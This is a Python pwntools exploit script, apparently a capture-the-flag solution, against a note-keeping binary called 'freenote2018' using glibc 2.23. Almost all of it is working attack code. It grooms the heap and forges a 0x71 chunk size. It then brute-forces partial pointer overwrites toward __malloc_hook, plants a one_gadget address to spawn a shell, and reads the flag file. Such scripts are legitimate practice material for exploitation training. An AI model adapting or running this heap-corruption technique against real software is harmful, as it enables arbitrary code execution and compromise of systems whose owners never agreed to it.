
#!/usr/bin/python
from pwn import *
import sys
# context.log_level = 'debug'


#raw_input()

def menu():
	p.recvuntil("Choice:")

def create(size, data):
	menu()
	p.sendline("1")
	p.recvuntil(":")
	p.sendline(str(size))
	p.recvuntil(":")
	p.send(data)

def free(idx):
	menu()
	p.sendline("3")
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx, data):
	menu()
	p.sendline("2")
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil(":")
	p.send(data)


r = 2 ** 12
while r != 0:
	r -= 1
	# if r != 0:
	try:
		# name = "A"*20
		# p.recvuntil(":")
		# p.sendline(name)
		p = process('./freenote2018', env={"LD_PRELOAD":"./libc-2.23.so"})
		# gdb.attach(p)
		# with open('/proc/' + str(pidof(p)[0]) + '/maps') as f:
		# 	data = f.read()
		# for i in data.split('\n'):
		# 	if 'libc' in i:
		# 		libc_base = int(i[ : i.index('-')], 16)
		# 		break
		# if libc_base & 0xffffff == 0xb2f000:
		# 	log.info('got it')
		# 	raw_input('debug?')
		# one_gadget = 0xf1147
		one_gadget = 0xf02a4
		# one_gadget = 0x4526a
		malloc_hook = 0x3c4b10
		# log.info('libc base is : ' + hex(libc_base))
		# log.info('b ' + hex(libc_base + one_gadget))
		# libc_base = libc_base & 0xffffff
		libc_base = 0xb2f000
		# log.info('libc base is : ' + hex(libc_base))

		create(0x100 - 0x20 - 0x10,'hack by swing') # 0
		free(0)

		create(24 - 8,'\x00') # 1
		create(200 - 8,'\x00') # 2
		fake = "A"*104
		fake += p64(0x61)
		edit(2, fake) 

		create(101 - 8,'\x00') # 3

		free(2)
		create(200 - 8,'\x00') # 4  1

		over = "A"*24
		over += "\x71"
		edit(0, over)
		create(101 - 8,'\x00') # 5
		create(101 - 8,'\x00') # 6
		create(101 - 8,'\x00') # 7
		# create(101 - 8,'\x00') # 8
		# create(101 - 8,'\x00') # 9
		# create(101 - 8,'\x00') # 10
		free(3)
		free(5)

		heap_po = "\x20"
		edit(5, heap_po)

		# arena_po = "\xcd\x6a"
		arena_po = p64(libc_base + malloc_hook - 0x23)[0 : 2]
		edit(4, arena_po)
		# raw_input()
		create(101 - 8,'\x00') # 11
		create(101 - 8,'\x00') # 12
		# raw_input()
		create(101 - 8,'\x00') # 13
		#p.interactive()

		# Control arena through 0.
		# Now unsorted bin attack.

		# First fix 0x71 freelist.
		free(6)
		edit(6,p64(0x00))

		# raw_input()
		# Fixed.
		# 0x7f702619777b

		create(200 - 8,'\x00') # 14
		create(200 - 8,'\x00') # 15
		create(24 - 8,'\x00') # 16
		create(200 - 8,'\x00') # 17

		free(12)
		po = "B"*8
		# po += "\xe0\x6a"
		po += p64(libc_base + malloc_hook - 0x10)[0 : 2]
		edit(12, po)

		create(200 - 8,'\x00') # 19
		#5b394f
		over = "R"*19
		# over += "\x4f\x59\xc0"
		over += p64(libc_base + one_gadget)[0 : 3]
		edit(10,over)



		# menu()
		# p.sendline("1")
		# p.recvuntil(":")
		# p.send('1')
		# create(200 - 8,'\x00')
		free(15)
		# free(15)
		p.recvline()
		resp = p.recv(4, timeout=2)
		p.sendline('ls')
		print p.recv(1024)
		p.sendline('cat ./flag')
		print p.recv(1024)
		# p.interactive()
		break
	except:
		p.close()
